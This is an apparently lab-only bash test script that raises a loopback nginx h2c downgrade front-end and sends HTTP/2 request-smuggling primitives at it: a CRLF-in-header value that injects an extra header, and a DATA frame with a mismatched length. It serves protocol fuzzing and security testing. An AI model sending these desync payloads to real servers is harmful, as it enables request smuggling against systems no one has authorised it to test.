#!/usr/bin/env bash
#
# Part K — Phase 9: protocol depth (raw h2c over a live socket), end to end.
#
# Runs the runbook Part K activities against the lab's opt-in h2->h1 downgrade
# front-end (nginx h2c on loopback):
#   1. Bring up the desync front-end (compose 'desync' profile, default off).
#   2. Wait for it to accept connections on 127.0.0.1:PORT.
#   3. Normal request: send a real HTTP/2 request over an h2c socket with the raw client
#      and confirm the front-end serves a response through the downgrade (self-test).
#   4. Desync primitive: emit a byte-exact CRLF-in-header and a length-desync frame with
#      the raw client and report how the front-end handles them (informational — a
#      patched nginx correctly rejects these; the point is the client can emit them).
#
# LAB-ONLY, loopback, on infrastructure you own. Dual-use protocol tooling; the desync
# front-end is opt-in and never exposed. Idempotent.
#
# Env knobs (optional):
#   PFF_DOWNGRADE_PORT   front-end h2c port (default 8081)
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
cd "${REPO_ROOT}"

H2C_PORT="${PFF_DOWNGRADE_PORT:-8081}"

say() { printf '\n\033[1m== %s\033[0m\n' "$*"; }
die() { printf '\033[31mERROR: %s\033[0m\n' "$*" >&2; exit 1; }

# --- 1. bring up the desync front-end ---------------------------------------
say "1/4  Bringing up the h2->h1 downgrade front-end (compose 'desync' profile)"
( cd lab && PFF_PROFILE=desync ./labctl.sh up )

# --- 2. wait for h2c ---------------------------------------------------------
say "2/4  Waiting for the front-end on 127.0.0.1:${H2C_PORT}"
ok=0
for _ in $(seq 1 60); do
  if (exec 3<>"/dev/tcp/127.0.0.1/${H2C_PORT}") 2>/dev/null; then exec 3>&- 3<&-; ok=1; break; fi
  sleep 1
done
[ "${ok}" = 1 ] || die "front-end not reachable on 127.0.0.1:${H2C_PORT} (cd lab && ./labctl.sh logs)"
echo "front-end up."

# --- 3. normal request through the downgrade (self-test) --------------------
say "3/4  Sending a real HTTP/2 request over h2c and reading the response"
python - "$H2C_PORT" <<'PY' || die "no HTTP/2 response served through the downgrade"
import sys
from fuzzlab.proxy.h2transport import H2Transport
port = int(sys.argv[1])
resp = H2Transport(timeout=10).request("127.0.0.1", port, "GET", "/product.php?id=1")
status = resp.status
frames = ", ".join(sorted({str(f.type) for f in resp.frames})) or "(none)"
print(f"  frame types seen: {frames}")
print(f"  :status = {status if status is not None else '(nginx Huffman-coded; not decoded)'}")
print(f"  response body: {len(resp.body)} byte(s)")
if not resp.got_headers or len(resp.body) == 0:
    raise SystemExit("  FAIL: expected a HEADERS frame and a non-empty body on our stream")
print("  OK: a normal request is served through the h2->h1 downgrade.")
PY

# --- 4. desync primitive (informational) ------------------------------------
say "4/4  Emitting h2->h1 desync primitives byte-exact (informational)"
python - "$H2C_PORT" <<'PY'
import sys
from fuzzlab.proxy import h2frames
from fuzzlab.proxy.h2client import H2RawClient
from fuzzlab.proxy.h2transport import H2Transport
port = int(sys.argv[1])
tx = H2Transport(timeout=5)
client = H2RawClient()

# (a) CRLF inside an h2 header value -> HPACK carries it verbatim; a downgrading
#     front-end is what may mis-split it into a smuggled header on the HTTP/1.1 side.
raw = client.build_request("GET", "/", f"127.0.0.1:{port}", "http",
                           headers=[(b"x-smuggle", b"a\r\nX-Injected: 1")])
back = tx.send_raw("127.0.0.1", port, raw, settle=0.5)
frames, _ = h2frames.decode_frames(back)
goaway = [f for f in frames if f.type == h2frames.GOAWAY]
print(f"  CRLF-in-header request: {len(raw)} bytes emitted; "
      f"{len(back)} bytes back, {len(frames)} frame(s)"
      + (f", GOAWAY (front-end rejected the primitive — correct for a patched nginx)"
         if goaway else " (inspect frames for how the front-end handled it)"))

# (b) length-desync frame: declares 1 byte, carries 4.
raw2 = client.build_raw([h2frames.encode_frame(h2frames.DATA, 0, 1, b"AAAA", length=1)])
back2 = tx.send_raw("127.0.0.1", port, raw2, settle=0.5)
print(f"  length-desync frame: {len(raw2)} bytes emitted; {len(back2)} bytes back")
print("  (The raw client put both primitives on the wire byte-exact. Demonstrating a "
      "successful smuggle requires a front-end that mis-handles them — lab-only.)")
PY

say "Done. The from-scratch h2 client now sends/receives over a live h2c socket."
echo "  Bring the front-end down when finished:  ( cd lab && ./labctl.sh down )"
